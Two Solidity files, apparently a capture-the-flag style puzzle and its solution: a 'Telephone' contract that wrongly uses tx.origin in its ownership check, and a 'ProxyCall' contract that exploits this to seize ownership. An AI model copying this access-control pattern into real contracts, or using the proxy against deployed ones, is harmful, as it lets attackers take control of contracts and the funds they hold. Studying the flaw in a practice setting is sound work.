// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Telephone} from "./Telephone.sol";

contract ProxyCall {
    function forward(Telephone _to) public {
        _to.changeOwner(msg.sender);
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}